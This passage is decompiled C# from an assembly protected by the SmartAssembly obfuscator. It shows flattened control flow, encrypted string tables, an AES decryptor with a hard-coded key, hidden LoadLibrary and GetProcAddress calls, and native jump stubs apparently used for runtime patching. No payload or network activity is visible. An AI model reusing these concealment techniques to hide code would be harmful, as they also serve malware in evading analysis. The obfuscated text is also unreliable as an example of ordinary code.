						break;
					case 216:
						num18 = 133 - 44;
						num2 = 172;
						continue;
					case 371:
						array[10] = (byte)num17;
						num2 = 181;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 1:
						num18 = 106 + 81;
						num2 = 100;
						continue;
					case 308:
						num21 = 0u;
						num2 = 263;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 413:
						num17 = 179 - 59;
						num2 = 426;
						continue;
					case 273:
						num23 = num19 * 4;
						num2 = 187;
						continue;
					case 148:
						num17 = 217 - 72;
						num2 = 246;
						continue;
					case 257:
						array[26] = 107;
						num2 = 36;
						continue;
					case 135:
						array[13] = (byte)num17;
						num2 = 2;
						if (global::\u0004.\u0001.\u0004() == null)
						{
							continue;
						}
						break;
					case 209:
						num17 = 104 - 83;
						num2 = 419;
						if (!global::\u0004.\u0001.\u0002())
						{
							num2 = 358;
						}
						continue;
					case 106:
						stream = (Stream)global::\u0004.\u0001.\u0002();
						num2 = 81;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 131:
						num17 = 165 - 122;
						num = 103;
						break;
					case 366:
						array[7] = 96;
						num2 = 403;
						continue;
					case 253:
						array2[7] = (byte)num18;
						num = 157;
						break;
					case 367:
						array2[9] = 87;
						num2 = 88;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 412:
						array[30] = 150;
						num2 = 23;
						continue;
					case 227:
						num21 = (uint)((array3[num22 + 3] << 24) | (array3[num22 + 2] << 16) | (array3[num22 + 1] << 8) | array3[num22]);
						num2 = 247;
						continue;
					case 211:
						num17 = 196 + 27;
						num2 = 8;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 53:
						num20 <<= 8;
						num = 387;
						break;
					case 32:
						array[18] = 245;
						num2 = 234;
						continue;
					case 186:
						array3[num32] ^= array6[num32];
						num2 = 415;
						continue;
					case 67:
					case 132:
						num19++;
						num2 = 46;
						if (global::\u0004.\u0001.\u0002())
						{
							num2 = 239;
						}
						continue;
					case 119:
						array[28] = (byte)num17;
						num2 = 10;
						continue;
					case 125:
						array[29] = 49;
						num2 = 335;
						continue;
					case 199:
						num17 = 63 + 11;
						num = 214;
						break;
					case 327:
						array[0] = (byte)num17;
						num2 = 206;
						if (global::\u0004.\u0001.\u0002())
						{
							continue;
						}
						break;
					case 2:
						num17 = 101 + 73;
						num = 398;
						break;
					case 183:
						array2[5] = (byte)num18;
						num2 = 182;
						continue;
					case 16:
						array[3] = (byte)num17;
						num2 = 330;
						continue;
					case 78:
					{
						uint num3 = num4;
						uint num5 = num4;
						uint num6 = 1340095928u;
						uint num7 = 1417025097u;
						uint num8 = 969771444u;
						uint num9 = 667600810u;
						uint num10 = num5;
						uint num11 = 1737603405u;
						uint num12 = ((num8 >> 12) | (num8 << 20)) + num7;
						uint num13 = num12 & 0xF0F0F0F;
						num12 &= 0xF0F0F0F0u;
						num8 = (num12 >> 4) | (num13 << 4);
						num6 ^= num9;
						if ((double)num7 == 0.0)
						{
							num7--;
						}
						uint num14 = (uint)((double)num8 / (double)num7 + (double)num7);
						num7 = (uint)((double)(4294944026u * num14) + 739643327.0);
						num9 -= num8;
						uint num15 = num11 & 0xFF00FF;
						uint num16 = num11 & 0xFF00FF00u;
						num15 = ((num15 >> 8) | (num16 << 8)) ^ num8;
						num11 = (num11 >> 7) | (num11 << 25);
						num10 ^= num10 >> 4;
						num10 += num7;
						num10 ^= num10 >> 17;
						num10 += num9;
						num10 ^= num10 << 3;
						num10 += num11;
						num10 = (((num9 << 7) - num8) ^ num7) + num10;
						num4 = num3 + (uint)(double)num10;
						num2 = 33;
						continue;
					}
					}
					break;
				}
			}
		}

		[\u0002(typeof(\u0001[]))]
		internal static string \u0001(string \u0002)
		{
			\u0097(780).Trim();
			byte[] array = Convert.FromBase64String(\u0002);
			return Encoding.Unicode.GetString(array, 0, array.Length);
		}

		private static int \u0001()
		{
			return 5;
		}

		private static void \u0003()
		{
			try
			{
				RSACryptoServiceProvider.UseMachineKeyStore = true;
			}
			catch
			{
			}
		}

		private static Delegate \u0001(IntPtr \u0002, Type \u0003)
		{
			return (Delegate)typeof(Marshal).GetMethod(\u0097(817), new Type[2]
			{
				typeof(IntPtr),
				typeof(Type)
			}).Invoke(null, new object[2] { \u0002, \u0003 });
		}

		internal static object \u0001(object \u0002)
		{
			try
			{
				if (File.Exists(((Assembly)\u0002).Location))
				{
					return ((Assembly)\u0002).Location;
				}
			}
			catch
			{
			}
			try
			{
				if (File.Exists(((Assembly)\u0002).GetName().CodeBase.ToString().Replace(\u0097(858), \u0097(453))))
				{
					return ((Assembly)\u0002).GetName().CodeBase.ToString().Replace(\u0097(858), \u0097(453));
				}
			}
			catch
			{
			}
			try
			{
				if (File.Exists(\u0002.GetType().GetProperty(\u0097(871)).GetValue(\u0002, new object[0])
					.ToString()))
				{
					return \u0002.GetType().GetProperty(\u0097(871)).GetValue(\u0002, new object[0])
						.ToString();
				}
			}
			catch
			{
			}
			return \u0097(453);
		}

		[DllImport("kernel32", EntryPoint = "LoadLibrary")]
		public static extern IntPtr \u0001(string \u0002);

		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
		public static extern IntPtr \u0001(IntPtr \u0002, string \u0003);

		private static IntPtr \u0001(IntPtr \u0002, string \u0003, uint \u0004)
		{
			if (\u001e == null)
			{
				IntPtr ptr = \u0001(\u0001(), \u0097(884).Trim() + \u0097(893));
				\u001e = (\u0008)Marshal.GetDelegateForFunctionPointer(ptr, typeof(\u0008));
			}
			return \u001e(\u0002, \u0003, \u0004);
		}

		private static IntPtr \u0001(IntPtr \u0002, uint \u0003, uint \u0004, uint \u0005)
		{
			if (\u0089 == null)
			{
				IntPtr ptr = \u0001(\u0001(), \u0097(906).Trim() + \u0097(919));
				\u0089 = (\u000e)Marshal.GetDelegateForFunctionPointer(ptr, typeof(\u000e));
			}
			return \u0089(\u0002, \u0003, \u0004, \u0005);
		}

		private static int \u0001(IntPtr \u0002, IntPtr \u0003, [In][Out] byte[] \u0004, uint \u0005, out IntPtr \u0006)
		{
			if (global::\u0004.\u0001.m_\u0013 == null)
			{
				IntPtr ptr = \u0001(\u0001(), \u0097(928).Trim() + \u0097(937).Trim() + \u0097(950));
				global::\u0004.\u0001.m_\u0013 = (\u000f)Marshal.GetDelegateForFunctionPointer(ptr, typeof(\u000f));
			}
			return global::\u0004.\u0001.m_\u0013(\u0002, \u0003, \u0004, \u0005, out \u0006);
		}

		private static int \u0001(IntPtr \u0002, int \u0003, int \u0004, ref int \u0005)
		{
			if (\u0086 == null)
			{
				IntPtr ptr = \u0001(\u0001(), \u0097(906).Trim() + \u0097(959));
				\u0086 = (\u0010)Marshal.GetDelegateForFunctionPointer(ptr, typeof(\u0010));
			}
			return \u0086(\u0002, \u0003, \u0004, ref \u0005);
		}

		private static IntPtr \u0001(uint \u0002, int \u0003, uint \u0004)
		{
			if (\u0019 == null)
			{
				IntPtr ptr = \u0001(\u0001(), \u0097(972).Trim() + \u0097(981));
				\u0019 = (\u0011)Marshal.GetDelegateForFunctionPointer(ptr, typeof(\u0011));
			}
			return \u0019(\u0002, \u0003, \u0004);
		}

		private static int \u0001(IntPtr \u0002)
		{
			if (\u0083 == null)
			{
				IntPtr ptr = \u0001(\u0001(), \u0097(994).Trim() + \u0097(1003));
				\u0083 = (\u0012)Marshal.GetDelegateForFunctionPointer(ptr, typeof(\u0012));
			}
			return \u0083(\u0002);
		}

		[SpecialName]
		private static IntPtr \u0001()
		{
			if (\u001f == IntPtr.Zero)
			{
				\u001f = global::\u0004.\u0001.\u0001(\u0097(1012).Trim() + \u0097(1025));
			}
			return \u001f;
		}

		[\u0002(typeof(\u0001[]))]
		private static byte[] \u0001(string \u0002)
		{
			using FileStream fileStream = new FileStream(\u0002, FileMode.Open, FileAccess.Read, FileShare.Read);
			int num = 0;
			long length = fileStream.Length;
			int num2 = (int)length;
			byte[] array = new byte[num2];
			while (num2 > 0)
			{
				int num3 = fileStream.Read(array, num, num2);
				num += num3;
				num2 -= num3;
			}
			return array;
		}

		internal static Stream \u0001()
		{
			return new MemoryStream();
		}

		internal static byte[] \u0001(Stream \u0002)
		{
			return ((MemoryStream)\u0002).ToArray();
		}

		[\u0002(typeof(\u0001[]))]
		private static byte[] \u0003(byte[] \u0002)
		{
			Stream stream = global::\u0004.\u0001.\u0001();
			SymmetricAlgorithm symmetricAlgorithm = global::\u0004.\u0001.\u0001();
			symmetricAlgorithm.Key = new byte[32]
			{
				203, 110, 137, 171, 10, 246, 136, 40, 78, 233,
				145, 55, 96, 194, 242, 196, 227, 56, 157, 129,
				111, 111, 85, 158, 91, 21, 152, 173, 146, 124,
				204, 129
			};
			symmetricAlgorithm.IV = new byte[16]
			{
				139, 49, 169, 30, 35, 98, 126, 194, 17, 2,
				202, 126, 209, 200, 90, 27
			};
			CryptoStream cryptoStream = new CryptoStream(stream, symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(\u0002, 0, \u0002.Length);
			cryptoStream.Close();
			byte[] result = \u0001(stream);
			global::\u0008.\u0002.\u0001();
			return result;
		}

		private byte[] \u0001()
		{
			return null;
		}

		private byte[] \u0002()
		{
			return null;
		}

		private byte[] \u0003()
		{
			string text = \u0097(1034);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		private byte[] \u0004()
		{
			string text = \u0097(1071);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		private byte[] \u0005()
		{
			string text = \u0097(1108);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		private byte[] \u0006()
		{
			string text = \u0097(1145);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		internal byte[] \u0007()
		{
			string text = \u0097(1182);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		internal byte[] \u0008()
		{
			string text = \u0097(1219);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		internal byte[] \u000e()
		{
			string text = \u0097(1256);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		internal byte[] \u000f()
		{
			string text = \u0097(1293);
			if (text.Length > 0)
			{
				return new byte[2] { 1, 2 };
			}
			return new byte[2] { 1, 2 };
		}

		internal static object \u0001(object P_0, object P_1)
		{
			return ((Assembly)P_0).GetManifestResourceStream((string)P_1);
		}

		internal static object \u0002(object P_0)
		{
			return ((\u0007)P_0).\u0001();
		}

		internal static void \u0001(object P_0, long P_1)
		{
			((Stream)P_0).Position = P_1;
		}

		internal static long \u0001(object P_0)
		{
			return ((Stream)P_0).Length;
		}

		internal static object \u0001(object P_0, int \u0003)
		{
			return ((\u0007)P_0).\u0001(\u0003);
		}

		internal static void \u0001(object P_0)
		{
			((\u0007)P_0).\u0001();
		}

		internal static void \u0002(object P_0)
		{
			Array.Reverse((Array)P_0);
		}

		internal static object \u0003(object P_0)
		{
			return ((Assembly)P_0).GetName();
		}

		internal static object \u0004(object P_0)
		{
			return ((AssemblyName)P_0).GetPublicKeyToken();
		}

		internal static object \u0001()
		{
			return global::\u0004.\u0001.\u0001();
		}

		internal static void \u0001(object P_0, CipherMode P_1)
		{
			((SymmetricAlgorithm)P_0).Mode = P_1;
		}

		internal static object \u0001(object P_0, object P_1, object P_2)
		{
			return ((SymmetricAlgorithm)P_0).CreateDecryptor((byte[])P_1, (byte[]?)P_2);
		}

		internal static object \u0002()
		{
			return global::\u0004.\u0001.\u0001();
		}

		internal static void \u0001(object P_0, object P_1, int P_2, int P_3)
		{
			((Stream)P_0).Write((byte[])P_1, P_2, P_3);
		}

		internal static void \u0003(object P_0)
		{
			((CryptoStream)P_0).FlushFinalBlock();
		}

		internal static object \u0005(object P_0)
		{
			return \u0001((Stream)P_0);
		}

		internal static void \u0004(object P_0)
		{
			((Stream)P_0).Close();
		}

		internal static int \u0001(object P_0, int P_1)
		{
			return BitConverter.ToInt32((byte[])P_0, P_1);
		}

		internal static void \u0004()
		{
			global::\u0008.\u0002.\u0001();
		}

		internal static object \u0003()
		{
			return Encoding.Unicode;
		}

		internal static object \u0001(object P_0, object P_1, int P_2, int P_3)
		{
			return ((Encoding)P_0).GetString((byte[])P_1, P_2, P_3);
		}

		internal static bool \u0002()
		{
			return (object)null == null;
		}

		internal static object \u0004()
		{
			return null;
		}
	}
}
namespace \u0008
{
	internal class \u0002
	{
		private static bool m_\u0001;

		internal static void \u0001()
		{
		}
	}
}
namespace \u000f
{
	[CompilerGenerated]
	internal class \u0001
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 256)]
		private struct \u0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 40)]
		private struct \u0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 30)]
		private struct \u0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 32)]
		private struct \u0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		private struct \u0005
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 64)]
		private struct \u0006
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 18)]
		private struct \u0007
		{
		}

		internal static \u0001 \u0001/* Not supported: data(78 A4 6A D7 56 B7 C7 E8 DB 70 20 24 EE CE BD C1 AF 0F 7C F5 2A C6 87 47 13 46 30 A8 01 95 46 FD D8 98 80 69 AF F7 44 8B B1 5B FF FF BE D7 5C 89 22 11 90 6B 93 71 98 FD 8E 43 79 A6 21 08 B4 49 62 25 1E F6 40 B3 40 C0 51 5A 5E 26 AA C7 B6 E9 5D 10 2F D6 53 14 44 02 81 E6 A1 D8 C8 FB D3 E7 E6 CD E1 21 D6 07 37 C3 87 0D D5 F4 ED 14 5A 45 05 E9 E3 A9 F8 A3 EF FC D9 02 6F 67 8A 4C 2A 8D 42 39 FA FF 81 F6 71 87 22 61 9D 6D 0C 38 E5 FD 44 EA BE A4 A9 CF DE 4B 60 4B BB F6 70 BC BF BE C6 7E 9B 28 FA 27 A1 EA 85 30 EF D4 05 1D 88 04 39 D0 D4 D9 E5 99 DB E6 F8 7C A2 1F 65 56 AC C4 44 22 29 F4 97 FF 2A 43 A7 23 94 AB 39 A0 93 FC C3 59 5B 65 92 CC 0C 8F 7D F4 EF FF D1 5D 84 85 4F 7E A8 6F E0 E6 2C FE 14 43 01 A3 A1 11 08 4E 82 7E 53 F7 35 F2 3A BD BB D2 D7 2A 91 D3 86 EB) */;

		internal static \u0002 \u0002/* Not supported: data(48 B8 00 00 00 00 00 00 00 00 49 39 40 08 74 0C 48 B8 00 00 00 00 00 00 00 00 FF E0 48 B8 00 00 00 00 00 00 00 00 FF E0) */;

		internal static \u0003 \u0003/* Not supported: data(55 8B EC 8B 45 10 81 78 04 7D 1D EA 0C 74 07 B8 B6 B1 4A 06 EB 05 B8 B6 92 40 0C 5D FF E0) */;

		internal static \u0004 \u0004/* Not supported: data(CB 6E 89 AB 0A F6 88 28 4E E9 91 37 60 C2 F2 C4 E3 38 9D 81 6F 6F 55 9E 5B 15 98 AD 92 7C CC 81) */;

		internal static \u0005 \u0005/* Not supported: data(8B 31 A9 1E 23 62 7E C2 11 02 CA 7E D1 C8 5A 1B) */;

		internal static \u0004 \u0006/* Not supported: data(52 66 68 6E 20 4D 18 22 76 B5 33 11 12 33 0C 6D 0A 20 4D 18 22 9E A1 29 61 1C 76 B5 05 19 01 58) */;

		internal static \u0006 \u0007/* Not supported: data(04 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 03 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00) */;

		internal static \u0007 \u0008/* Not supported: data(30 20 30 0C 06 08 2A 86 48 86 F7 0D 02 00 05 00 04 10) */;
	}
}
namespace \u0002
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class \u0001 : Attribute
	{
	}
}
namespace \u0006
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal class \u0002 : Attribute
	{
	}
}
namespace \u0001
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal class \u0003 : Attribute
	{
	}
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal class \u0004 : Attribute
	{
	}
}
namespace \u000e
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal class \u0001 : Attribute
	{
	}
}
namespace \u0003
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method)]
	internal class \u0002 : Attribute
	{
	}
}
namespace SmartAssembly.Delegates
{
	public delegate string GetString(int i);
}
namespace SmartAssembly.HouseOfCards
{
	public static class MemberRefsProxy
	{
		private static ModuleHandle \u0001;

		private static char[] \u0001;

		[\u0002.\u0001]
		public static void CreateMemberRefsDelegates(int typeID)
		{
			Type typeFromHandle;
			try
			{
				typeFromHandle = Type.GetTypeFromHandle(MemberRefsProxy.\u0001.ResolveTypeHandle(33554433 + typeID));
			}
			catch
			{
				return;
			}
			FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
			foreach (FieldInfo fieldInfo in fields)
			{
				string name = fieldInfo.Name;
				bool flag = false;
				int num = 0;
				for (int num2 = name.Length - 1; num2 >= 0; num2--)
				{
					char c = name[num2];
					if (c == '~')
					{
						flag = true;
						break;
					}
					for (int j = 0; j < 58; j++)
					{
						if (\u0001[j] == c)
						{
							num = num * 58 + j;
							break;
						}
					}
				}
				MethodInfo methodInfo;
				try
				{
					methodInfo = (MethodInfo)MethodBase.GetMethodFromHandle(MemberRefsProxy.\u0001.ResolveMethodHandle(num + 167772161));
				}
				catch
				{
					continue;
				}
				Delegate value;
				if (methodInfo.IsStatic)
				{
					try
					{
						value = Delegate.CreateDelegate(fieldInfo.FieldType, methodInfo);
					}
					catch (Exception)
					{
						continue;
					}
				}
				else
				{
					ParameterInfo[] parameters = methodInfo.GetParameters();
					int num3 = parameters.Length + 1;
					Type[] array = new Type[num3];
					array[0] = typeof(object);
					for (int k = 1; k < num3; k++)
					{
						array[k] = parameters[k - 1].ParameterType;
					}
					DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodInfo.ReturnType, array, typeFromHandle, skipVisibility: true);
					ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
					iLGenerator.Emit(OpCodes.Ldarg_0);
					if (num3 > 1)
					{
						iLGenerator.Emit(OpCodes.Ldarg_1);
					}
					if (num3 > 2)
					{
						iLGenerator.Emit(OpCodes.Ldarg_2);
					}
					if (num3 > 3)
					{
						iLGenerator.Emit(OpCodes.Ldarg_3);
					}
					if (num3 > 4)
					{
						for (int l = 4; l < num3; l++)
						{
							iLGenerator.Emit(OpCodes.Ldarg_S, l);
						}
					}
					iLGenerator.Emit(OpCodes.Tailcall);
					iLGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
					iLGenerator.Emit(OpCodes.Ret);
					try
					{
						value = dynamicMethod.CreateDelegate(typeFromHandle);
					}
					catch
					{
						continue;
					}
				}
				try
				{
					fieldInfo.SetValue(null, value);
				}
				catch
				{
				}
			}
		}

		static MemberRefsProxy()
		{
			\u0001 = new char[58]
			{
				'\u0001', '\u0002', '\u0003', '\u0004', '\u0005', '\u0006', '\a', '\b', '\u000e', '\u000f',
				'\u0010', '\u0011', '\u0012', '\u0013', '\u0014', '\u0015', '\u0016', '\u0017', '\u0018', '\u0019',
				'\u001a', '\u001b', '\u001c', '\u001d', '\u001e', '\u001f', '\u007f', '\u0080', '\u0081', '\u0082',
				'\u0083', '\u0084', '\u0086', '\u0087', '\u0088', '\u0089', '\u008a', '\u008b', '\u008c', '\u008d',
				'\u008e', '\u008f', '\u0090', '\u0091', '\u0092', '\u0093', '\u0094', '\u0095', '\u0096', '\u0097',
				'\u0098', '\u0099', '\u009a', '\u009b', '\u009c', '\u009d', '\u009e', '\u009f'
			};
			Type typeFromHandle = typeof(MulticastDelegate);
			if ((object)typeFromHandle != null)
			{
				MemberRefsProxy.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
			}
		}
	}
	public static class Strings
	{
		[\u0002.\u0001]
		public static void CreateGetStringDelegate(Type ownerType)
		{
			FieldInfo[] fields = ownerType.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
			foreach (FieldInfo fieldInfo in fields)
			{
				try
				{
					if ((object)fieldInfo.FieldType != typeof(GetString))
					{
						continue;
					}
					DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, typeof(string), new Type[1] { typeof(int) }, ownerType.Module, skipVisibility: true);
					ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
					iLGenerator.Emit(OpCodes.Ldarg_0);
					MethodInfo[] methods = typeof(\u000e.\u0002).GetMethods(BindingFlags.Static | BindingFlags.Public);
					foreach (MethodInfo methodInfo in methods)
					{
						if ((object)methodInfo.ReturnType == typeof(string))
						{
							iLGenerator.Emit(OpCodes.Ldc_I4, fieldInfo.MetadataToken & 0xFFFFFF);
							iLGenerator.Emit(OpCodes.Sub);
							iLGenerator.Emit(OpCodes.Call, methodInfo);
							break;
						}
					}
					iLGenerator.Emit(OpCodes.Ret);
					fieldInfo.SetValue(null, dynamicMethod.CreateDelegate(typeof(GetString)));
					break;
				}
				catch
				{
				}
			}
		}
	}
}
namespace \u0001
{
	internal sealed class \u0001
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct \u0001
		{
		}

		internal static \u0001 \u0001/* Not supported: data(01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 0E 00 0F 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1A 00 1B 00 1C 00 1D 00 1E 00 1F 00 7F 00 80 00 81 00 82 00 83 00 84 00 86 00 87 00 88 00 89 00 8A 00 8B 00 8C 00 8D 00 8E 00 8F 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9A 00 9B 00 9C 00 9D 00 9E 00 9F 00) */;
	}
}
namespace \u000e
{
	internal class \u0002
	{
		private static readonly string m_\u0001;

		private static readonly string m_\u0002;

		private static readonly byte[] \u0003;

		private static readonly Dictionary<int, string> \u0004;

		private static readonly bool \u0005;

		private static readonly int \u0006;

		public static string \u0001(int \u0002)
		{
			\u0002 -= \u0006;
			if (\u0005)
			{
				\u0004.TryGetValue(\u0002, out var value);
				if (value != null)
				{
					return value;
				}
			}
			int num = 0;
			int index = \u0002;
			int num2 = \u0003[index++];
			if ((num2 & 0x80) != 0)
			{
				num = (((num2 & 0x40) != 0) ? (((num2 & 0x1F) << 24) + (\u0003[index++] << 16) + (\u0003[index++] << 8) + \u0003[index++]) : (((num2 & 0x3F) << 8) + \u0003[index++]));
			}
			else
			{
				num = num2;
				if (num == 0)
				{
					return string.Empty;
				}
			}
			try
			{
				byte[] array = Convert.FromBase64String(Encoding.UTF8.GetString(\u0003, index, num));
				string text = string.Intern(Encoding.UTF8.GetString(array, 0, array.Length));
				if (\u0005)
				{
					try
					{
						\u0004.Add(\u0002, text);
					}
					catch
					{
					}
				}
				return text;
			}
			catch
			{
				return null;
			}
		}

		static \u0002()
		{
			\u000e.\u0002.m_\u0001 = "1";
			m_\u0002 = "149";
			\u0003 = null;
			\u0005 = false;
			\u0006 = 0;
			if (\u000e.\u0002.m_\u0001 == "1")
			{
				\u0005 = true;
				\u0004 = new Dictionary<int, string>();
			}
			\u0006 = Convert.ToInt32(m_\u0002);
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			using Stream stream = executingAssembly.GetManifestResourceStream("{12c47dd7-8fe6-4468-b167-30e009e5b7cb}");
			int num = Convert.ToInt32(stream.Length);
			byte[] array = new byte[num];
			stream.Read(array, 0, num);
			\u0003 = global::\u0006.\u0004.\u0001(array);
			array = null;
			stream.Close();
		}
	}
}
namespace \u0002
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class \u0002 : Attribute
	{
	}
	[AttributeUsage(AttributeTargets.Method)]
	internal class \u0003 : Attribute
	{
	}
}
namespace \u0006
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class \u0003 : Attribute
	{
	}
	internal static class \u0004
	{
		internal class \u0001
		{
			private const int m_\u0001 = 0;

			private const int m_\u0002 = 1;

			private const int \u0003 = 2;

			private const int \u0004 = 3;

			private const int \u0005 = 4;

			private const int \u0006 = 5;

			private const int \u0007 = 6;

			private const int \u0008 = 7;

			private const int \u000e = 8;

			private const int \u000f = 9;

			private const int \u0010 = 10;

			private const int \u0011 = 11;

			private const int \u0012 = 12;

			private static readonly int[] \u0013 = new int[29]
			{
				3, 4, 5, 6, 7, 8, 9, 10, 11, 13,
				15, 17, 19, 23, 27, 31, 35, 43, 51, 59,
				67, 83, 99, 115, 131, 163, 195, 227, 258
			};

			private static readonly int[] \u0014 = new int[29]
			{
				0, 0, 0, 0, 0, 0, 0, 0, 1, 1,
				1, 1, 2, 2, 2, 2, 3, 3, 3, 3,
				4, 4, 4, 4, 5, 5, 5, 5, 0
			};

			private static readonly int[] \u0015 = new int[30]
			{
				1, 2, 3, 4, 5, 7, 9, 13, 17, 25,
				33, 49, 65, 97, 129, 193, 257, 385, 513, 769,
				1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577
			};

			private static readonly int[] \u0016 = new int[30]
			{
				0, 0, 0, 0, 1, 1, 2, 2, 3, 3,
				4, 4, 5, 5, 6, 6, 7, 7, 8, 8,
				9, 9, 10, 10, 11, 11, 12, 12, 13, 13
			};

			private int \u0017;

			private int \u0018;

			private int \u0019;

			private int \u001a;

			private int \u001b;

			private bool \u001c;

			private \u0002 \u001d;

			private \u0003 \u001e;

			private \u0005 \u001f;

			private \u0004 \u007f;

			private \u0004 \u0080;

			public \u0001(byte[] bytes)
			{
				\u001d = new \u0002();
				\u001e = new \u0003();
				\u0017 = 2;
				\u001d.\u0001(bytes, 0, bytes.Length);
			}

			private bool \u0001()
			{
				int num = \u001e.\u0001();
				while (num >= 258)
				{
					switch (\u0017)
					{
					case 7:
					{
						int num2;
						while (((num2 = \u007f.\u0001(\u001d)) & -256) == 0)
						{
							\u001e.\u0001(num2);
							if (--num < 258)
							{
								return true;
							}
						}
						if (num2 < 257)
						{
							if (num2 < 0)
							{
								return false;
							}
							\u0080 = null;
							\u007f = null;
							\u0017 = 2;
							return true;
						}
						\u0019 = \u0013[num2 - 257];
						\u0018 = \u0014[num2 - 257];
						goto case 8;
					}
					case 8:
						if (\u0018 > 0)
						{
							\u0017 = 8;
							int num3 = \u001d.\u0001(\u0018);
							if (num3 < 0)
							{
								return false;
							}
							\u001d.\u0001(\u0018);
							\u0019 += num3;
						}
						\u0017 = 9;
						goto case 9;
					case 9:
					{
						int num2 = \u0080.\u0001(\u001d);
						if (num2 < 0)
						{
							return false;
						}
						\u001a = \u0015[num2];
						\u0018 = \u0016[num2];
						break;
					}
					case 10:
						break;
					default:
						continue;
					}
					if (\u0018 > 0)
					{
						\u0017 = 10;
						int num4 = \u001d.\u0001(\u0018);
						if (num4 < 0)
						{
							return false;
						}
						\u001d.\u0001(\u0018);
						\u001a += num4;
					}
					\u001e.\u0001(\u0019, \u001a);
					num -= \u0019;
					\u0017 = 7;
				}
				return true;
			}

			private bool \u0002()
			{
				switch (\u0017)
				{
				case 2:
				{
					if (\u001c)
					{
						\u0017 = 12;
						return false;
					}
					int num = \u001d.\u0001(3);
					if (num < 0)
					{
						return false;
					}
					\u001d.\u0001(3);
					if ((num & 1) != 0)
					{
						\u001c = true;
					}
					switch (num >> 1)
					{
					case 0:
						\u001d.\u0001();
						\u0017 = 3;
						break;
					case 1:
						\u007f = global::\u0006.\u0004.\u0004.\u0003;
						\u0080 = global::\u0006.\u0004.\u0004.\u0004;
						\u0017 = 7;
						break;
					case 2:
						\u001f = new \u0005();
						\u0017 = 6;
						break;
					}
					return true;
				}
				case 3:
					if ((\u001b = \u001d.\u0001(16)) < 0)
					{
						return false;
					}
					\u001d.\u0001(16);
					\u0017 = 4;
					goto case 4;
				case 4:
				{
					int num2 = \u001d.\u0001(16);
					if (num2 < 0)
					{
						return false;
